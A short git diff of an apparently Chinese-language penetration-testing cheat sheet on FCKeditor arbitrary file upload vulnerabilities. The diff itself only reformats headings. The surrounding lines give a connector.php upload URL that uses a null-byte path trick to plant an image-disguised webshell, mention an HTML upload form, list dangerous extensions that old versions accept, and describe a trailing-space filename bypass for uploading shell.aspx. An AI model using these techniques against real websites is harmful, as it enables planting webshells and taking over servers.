@@ -56,7 +56,7 @@
      (b)fckeditor <= 2.6.4 For php 任意文件上传漏洞（iis判定路径有问题，返回500）
      `/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=%2Ftest.php%00.gif` 上传gif图片马即可
 ### (2)后台无验证
-     #### (a)fckeditor 2.x < =2.4.2 For php 在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，可上传任意文件。
+(a)fckeditor 2.x < =2.4.2 For php 在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，可上传任意文件。
 
      将以下保存为html文件，修改action地址。
  ```
@@ -66,7 +66,7 @@
     <input id="btnUpload" type="submit" value="Upload"/>
 </form>
 ```
-     #### (b)fckeditor <= 2.2 允许上传asa、cer、php2、php4、inc、pwml、pht
+(b)fckeditor <= 2.2 允许上传asa、cer、php2、php4、inc、pwml、pht
 ### (3) 空格绕过
 
      fckeditor<=2.4.1 提交shell.aspx+空格 绕过 【Windows测试成功】(2.4.1 success)
